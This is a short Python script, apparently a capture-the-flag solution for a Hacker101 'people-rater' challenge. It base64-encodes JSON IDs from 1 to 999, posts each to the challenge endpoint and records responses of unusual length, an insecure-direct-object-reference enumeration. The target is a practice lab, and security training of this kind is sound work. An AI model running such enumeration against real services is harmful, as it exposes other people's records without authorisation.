import requests, json, base64

l = []

for i in range(1, 1000):
    id = '{"id": '+str(i)+'}'
    id = base64.b64encode(bytes(id, 'utf-8'))
    id = str(id).strip("'b")
    url = f'https://5b226534b8f42b5d15de06ce27d5c237.ctf.hacker101.com/people-rater/entry/?id={id}'
    x = requests.post(url)
    if len(x.text) != 18 :
        l.append([i, len(x.text)])
    print(id, x.text)

print(l)
